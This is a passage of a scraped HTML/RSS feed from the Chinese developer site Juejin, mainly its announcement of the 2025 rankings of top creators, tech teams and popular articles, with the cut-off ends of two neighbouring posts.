<p>以上就是这一年我对于 <code>Vibe Coding</code> 的感想，也欢迎你来评论区华山论剑！</p>
<h2 data-id="heading-6">修改记录</h2>













<table><thead><tr><th>时间</th><th>内容</th></tr></thead><tbody><tr><td>2025年12月31日</td><td>完成初稿</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年度稀土掘金影响力榜单如约而至！]]></title>    <link>https://juejin.cn/post/7589823928413241370</link>    <guid>https://juejin.cn/post/7589823928413241370</guid>    <pubDate>2025-12-31T07:57:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589823928413241370" data-draft-id="7589578614583132186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年度稀土掘金影响力榜单如约而至！"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2025-12-31T07:57:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金酱"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194374926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年度稀土掘金影响力榜单如约而至！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194374926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T07:57:38.000Z" title="Wed Dec 31 2025 07:57:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    74
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">稀土掘金社区2025年度影响力榜单正式公布</h2>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d84e196bd63448db7cedc4f98be0bc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767776693&amp;x-signature=3%2FpoZvqVoSh7DM6g19xYfW5%2BI6Y%3D" alt="1303-734主视觉 (1) (3).jpg" width="100%" loading="lazy"/>
<p>时光向前，2025年即将落下句点。回首这一程，幸而有伴 —— 每一次深夜的打磨，每一段真诚的分享，每一回评论区里的倾力相助，都为技术探索的漫漫长路，点亮了一盏盏暖灯。</p>
<p>感谢这一年里，将实操经验凝注于代码、把深度思考落笔成文字的创作者。是每一个具体的 “你”，让稀土掘金始终活力满满。</p>
<p>今天，我们以这份榜单，记录那些值得被看见的光芒。它们来自团队扎实的沉淀，来自创作者持久的热情，也来自那些真正帮助过许多人的走心好文。</p>
<p><strong>榜单地址</strong>：<a href="https://aicoding.juejin.cn/pens/7589935553110835252" target="_blank" title="https://aicoding.juejin.cn/pens/7589935553110835252">aicoding.juejin.cn/pens/758993…</a></p>
<h2 data-id="heading-1">2025年度优秀创作者 | The Best 10 Creative Writers of 2025</h2>
<blockquote>
<p>他们是社区里的“解惑人”，把复杂讲得简单，把枯燥变得生动。他们的文字，曾陪伴无数掘友走出技术探索的迷茫时刻。</p>
</blockquote>

















































<table><thead><tr><th>站内昵称</th><th>个人主页</th></tr></thead><tbody><tr><td>Moment</td><td><a href="https://juejin.cn/user/3782764966460398" target="_blank" title="https://juejin.cn/user/3782764966460398">juejin.cn/user/378276…</a></td></tr><tr><td>ConardLi</td><td><a href="https://juejin.cn/user/3949101466785709" target="_blank" title="https://juejin.cn/user/3949101466785709">juejin.cn/user/394910…</a></td></tr><tr><td>何贤</td><td><a href="https://juejin.cn/user/277499952247869" target="_blank" title="https://juejin.cn/user/277499952247869">juejin.cn/user/277499…</a></td></tr><tr><td>洛卡卡了</td><td><a href="https://juejin.cn/user/888839672963544" target="_blank" title="https://juejin.cn/user/888839672963544">juejin.cn/user/888839…</a></td></tr><tr><td>why技术</td><td><a href="https://juejin.cn/user/3702810893364350" target="_blank" title="https://juejin.cn/user/3702810893364350">juejin.cn/user/370281…</a></td></tr><tr><td>恋猫de小郭</td><td><a href="https://juejin.cn/user/817692379985752" target="_blank" title="https://juejin.cn/user/817692379985752">juejin.cn/user/817692…</a></td></tr><tr><td>苏三说技术</td><td><a href="https://juejin.cn/user/465848661970824" target="_blank" title="https://juejin.cn/user/465848661970824">juejin.cn/user/465848…</a></td></tr><tr><td>coder_pig</td><td><a href="https://juejin.cn/user/4142615541321928" target="_blank" title="https://juejin.cn/user/4142615541321928">juejin.cn/user/414261…</a></td></tr><tr><td>张风捷特烈</td><td><a href="https://juejin.cn/user/149189281194766" target="_blank" title="https://juejin.cn/user/149189281194766">juejin.cn/user/149189…</a></td></tr><tr><td>德莱厄斯</td><td><a href="https://juejin.cn/user/3919115686512942" target="_blank" title="https://juejin.cn/user/3919115686512942">juejin.cn/user/391911…</a></td></tr></tbody></table>
<h2 data-id="heading-2">2025年度影响力团队 -The Most Influential Teams of 2025</h2>
<blockquote>
<p>他们以团队的力量，把一线实践沉淀成可复用的经验，如一张张清晰的技术地图，帮助不少同行找到了方向。</p>
</blockquote>

















































<table><thead><tr><th>团队名称</th><th>团队主页</th></tr></thead><tbody><tr><td>DevUI团队</td><td><a href="https://juejin.cn/user/712139267650141" target="_blank" title="https://juejin.cn/user/712139267650141">juejin.cn/user/712139…</a></td></tr><tr><td>vivo互联网技术</td><td><a href="https://juejin.cn/user/993614243303053" target="_blank" title="https://juejin.cn/user/993614243303053">juejin.cn/user/993614…</a></td></tr><tr><td>得物技术</td><td><a href="https://juejin.cn/user/2392954206960247" target="_blank" title="https://juejin.cn/user/2392954206960247">juejin.cn/user/239295…</a></td></tr><tr><td>古茗前端团队</td><td><a href="https://juejin.cn/user/3233040624266695" target="_blank" title="https://juejin.cn/user/3233040624266695">juejin.cn/user/323304…</a></td></tr><tr><td>货拉拉技术</td><td><a href="https://juejin.cn/user/1768489241815070" target="_blank" title="https://juejin.cn/user/1768489241815070">juejin.cn/user/176848…</a></td></tr><tr><td>京东零售技术</td><td><a href="https://juejin.cn/user/4233576972293643" target="_blank" title="https://juejin.cn/user/4233576972293643">juejin.cn/user/423357…</a></td></tr><tr><td>奇舞精选</td><td><a href="https://juejin.cn/user/4388906147515367" target="_blank" title="https://juejin.cn/user/4388906147515367">juejin.cn/user/438890…</a></td></tr><tr><td>37手游后端团队</td><td><a href="https://juejin.cn/user/1548527766871239" target="_blank" title="https://juejin.cn/user/1548527766871239">juejin.cn/user/154852…</a></td></tr><tr><td>哔哩哔哩技术</td><td><a href="https://juejin.cn/user/3030701626893405" target="_blank" title="https://juejin.cn/user/3030701626893405">juejin.cn/user/303070…</a></td></tr><tr><td>转转技术团队</td><td><a href="https://juejin.cn/user/606586148237431" target="_blank" title="https://juejin.cn/user/606586148237431">juejin.cn/user/606586…</a></td></tr></tbody></table>
<h2 data-id="heading-3">2025年度爆款好文 | High hits articles in 2025</h2>
<blockquote>
<p>这20篇文章，是从海量分享中脱颖而出的“年度之选”。它们或视角新颖、或剖析深入、或实战性强，在各自领域内获得了认可，成了许多掘友收藏或推荐的那一篇。</p>
</blockquote>



























































































































































<table><thead><tr><th>文章标题</th><th>文章链接</th><th>所属作者</th><th/></tr></thead><tbody><tr><td/><td><strong>前端</strong></td><td/><td/></tr><tr><td>《40岁老前端2025年上半年都学了什么？》</td><td><a href="https://juejin.cn/post/7524548909530005540" target="_blank" title="https://juejin.cn/post/7524548909530005540">juejin.cn/post/752454…</a></td><td>张鑫旭</td><td/></tr><tr><td>《前端仔如何在公司搭建 AI Review 系统》</td><td><a href="https://juejin.cn/post/7532596434031149106" target="_blank" title="https://juejin.cn/post/7532596434031149106">juejin.cn/post/753259…</a></td><td>唐某人丶</td><td/></tr><tr><td>《因为写了一个前端脚手架，这个月的KPI 打满了！！！》</td><td><a href="https://juejin.cn/post/7457936514791292938" target="_blank" title="https://juejin.cn/post/7457936514791292938">juejin.cn/post/745793…</a></td><td>赵小川</td><td/></tr><tr><td>《因网速太慢我把20M+的字体压缩到了几KB》</td><td><a href="https://juejin.cn/post/7490337281866317836" target="_blank" title="https://juejin.cn/post/7490337281866317836">juejin.cn/post/749033…</a></td><td>古茗前端团队</td><td/></tr><tr><td>《历经4个月，基于 Tiptap 和 NestJs 打造一款 AI 驱动的智能文档协作平台 🚀🚀🚀》</td><td><a href="https://juejin.cn/post/7553165143376134195" target="_blank" title="https://juejin.cn/post/7553165143376134195">juejin.cn/post/755316…</a></td><td>Moment</td><td/></tr><tr><td/><td><strong>后端</strong></td><td/><td/></tr><tr><td>《MCP 很火，来看看我们直接给后台管理系统上一个 MCP？》</td><td><a href="https://juejin.cn/post/7481491253499969575" target="_blank" title="https://juejin.cn/post/7481491253499969575">juejin.cn/post/748149…</a></td><td>Hamm</td><td/></tr><tr><td>《还在用WebSocket实现即时通讯？试试MQTT吧，真香！》</td><td><a href="https://juejin.cn/post/7539351775044862003" target="_blank" title="https://juejin.cn/post/7539351775044862003">juejin.cn/post/753935…</a></td><td>MacroZheng</td><td/></tr><tr><td>《我做了套小红书一键发布系统，运营小姐姐说她不想离开我了》</td><td><a href="https://juejin.cn/post/7552489208804491316" target="_blank" title="https://juejin.cn/post/7552489208804491316">juejin.cn/post/755248…</a></td><td>洛卡卡了</td><td/></tr><tr><td>《Java 实现责任链模式 + 策略模式：优雅处理多级请求的方式》</td><td><a href="https://juejin.cn/post/7457366224823124003" target="_blank" title="https://juejin.cn/post/7457366224823124003">juejin.cn/post/745736…</a></td><td>后端出路在何方</td><td/></tr><tr><td>《CompletableFuture还能这么玩》</td><td><a href="https://juejin.cn/post/7455561985378598951" target="_blank" title="https://juejin.cn/post/7455561985378598951">juejin.cn/post/745556…</a></td><td>一只叫煤球的猫</td><td/></tr><tr><td/><td><strong>移动端</strong></td><td/><td/></tr><tr><td>《2025 跨平台框架更新和发布对比，这是你没看过的全新版本》</td><td><a href="https://juejin.cn/post/7505578411492474915" target="_blank" title="https://juejin.cn/post/7505578411492474915">juejin.cn/post/750557…</a></td><td>恋猫de小郭</td><td/></tr><tr><td>《月下载 40 万次的框架是怎么练成的？》</td><td><a href="https://juejin.cn/post/7547408384585629711" target="_blank" title="https://juejin.cn/post/7547408384585629711">juejin.cn/post/754740…</a></td><td>Android轮子哥</td><td/></tr><tr><td>《[targetSDK升级为35] 恶心的EdgeToEdge适配 (v7)》</td><td><a href="https://juejin.cn/post/7497170890083762213" target="_blank" title="https://juejin.cn/post/7497170890083762213">juejin.cn/post/749717…</a></td><td>snwrking</td><td/></tr><tr><td>《gson很好，但我劝你在Kotlin上使用kotlinx.serialization》</td><td><a href="https://juejin.cn/post/7459298439811219496" target="_blank" title="https://juejin.cn/post/7459298439811219496">juejin.cn/post/745929…</a></td><td>沈剑心</td><td/></tr><tr><td>《开箱即食Flutter通用脚手架》</td><td><a href="https://juejin.cn/post/7482789772362317864" target="_blank" title="https://juejin.cn/post/7482789772362317864">juejin.cn/post/748278…</a></td><td>SunshineBrother</td><td/></tr><tr><td/><td><strong>人工智能</strong></td><td/><td/></tr><tr><td>《一天 AI 搓出痛风伴侣 H5 程序，前后端+部署通吃，还接入了大模型接口（万字总结）》</td><td><a href="https://juejin.cn/post/7517496354244067339" target="_blank" title="https://juejin.cn/post/7517496354244067339">juejin.cn/post/751749…</a></td><td>志辉AI编程</td><td/></tr><tr><td>《AI 应用开发入门：前端也可以学习 AI》</td><td><a href="https://juejin.cn/post/7517197769247391756" target="_blank" title="https://juejin.cn/post/7517197769247391756">juejin.cn/post/751719…</a></td><td>唐某人丶</td><td/></tr><tr><td>《如何把你的 DeePseek-R1 微调为某个领域的专家？》</td><td><a href="https://juejin.cn/post/7473309339294695460" target="_blank" title="https://juejin.cn/post/7473309339294695460">juejin.cn/post/747330…</a></td><td>ConardLi</td><td/></tr><tr><td>《3天，1人，从0到付费产品：AI时代个人开发者的生存指南》</td><td><a href="https://juejin.cn/post/7577653509862654002" target="_blank" title="https://juejin.cn/post/7577653509862654002">juejin.cn/post/757765…</a></td><td>HiStewie</td><td/></tr><tr><td>《全网最细，一文带你弄懂 MCP 的核心原理！》</td><td><a href="https://juejin.cn/post/7493455615244959794" target="_blank" title="https://juejin.cn/post/7493455615244959794">juejin.cn/post/749345…</a></td><td>ConardLi</td><td/></tr></tbody></table>
<h2 data-id="heading-4">好的社区，是人与人相互照亮</h2>
<p>这份榜单，与其说是评选，不如说是一次郑重的致谢。谢谢所有分享者，也谢谢每一位静静学习、默默点赞、热心评论的掘友。</p>
<p>技术之路，日常而长远。2026年，愿你继续在这里写下自己的章节，发出自己的光。我们相信，每一个人的微小光芒，终将汇聚成行业的星辰。</p>
<p>*注：以上排名不分先后，随机排序。本榜单依据<strong>2025年1月1日至12月21日</strong>期间的数据综合评定，涵盖文章质量、互动热度、创作者影响力、分类分布及评审团意见等多维度，最终解释权归稀土掘金所有。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[好久不见，年终总结 - 一个前端仔有趣的 2025]]></title>    <link>https://juejin.cn/post/7589494074982645811</link>    <guid>https://juejin.cn/post/7589494074982645811</guid>    <pubDate>2025-12-30T16:51:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589494074982645811" data-draft-id="7559150650677673993" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="好久不见，年终总结 - 一个前端仔有趣的 2025"/> <meta itemprop="keywords" content="年终总结,前端,面试"/> <meta itemprop="datePublished" content="2025-12-30T16:51:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="threerocks"/> <meta itemprop="url" content="https://juejin.cn/user/4265760845472078"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            好久不见，年终总结 - 一个前端仔有趣的 2025
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4265760845472078/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    threerocks
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T16:51:14.000Z" title="Tue Dec 30 2025 16:51:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    515
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 